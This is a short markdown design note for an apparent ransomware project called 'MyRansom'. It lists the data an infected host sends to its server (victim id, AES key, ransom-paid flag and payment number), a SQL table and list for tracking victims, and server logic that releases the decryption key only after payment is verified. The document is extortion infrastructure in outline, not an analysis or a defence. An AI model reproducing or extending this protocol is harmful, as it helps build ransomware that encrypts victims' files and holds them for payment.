# Args of MyRansom

## Infected Host

### init

```python
post_data = {
    'id': uuid.uuid1().hex
}
```

### aes key

```python
self.aes_key = self.enc_key()
post_data = {
    'id': self.id,
    'aes_key': self.aes_key
}
```

### paid

```python
post_data = {
    'id': self.id,
    'aes_key': self.aes_key,
    'ransom': True,
    'out_trade_no': out_trade_no
}
```

## Server

### database

```sql
    ID         VARCHAR(32)    NOT NULL,
    INFTIME    VARCHAR(100)    NOT NULL,
    RANSOM     BOOLEAN         NOT NULL,
    AESKEY     VARCHAR(100)    NOT NULL
```

### viclist

```python
viclist = [
    {
        'id': victim_id,
        'inftime': time.ctime()
        'ransom': False,
        'aes_key': aes_key
    }
]
```

### verify

```python
if not check_trade(out_trade_no):
    response = {
        'id': victim_id,
        'status': 'failure'
    }
```

### paid

```python
if check_trade(out_trade_no):
    aes_key = dec_key()
    response = {
        'id': victim_id,
        'aes_key': aes_key,
        'status': 'success'
    }
```

## Front-end
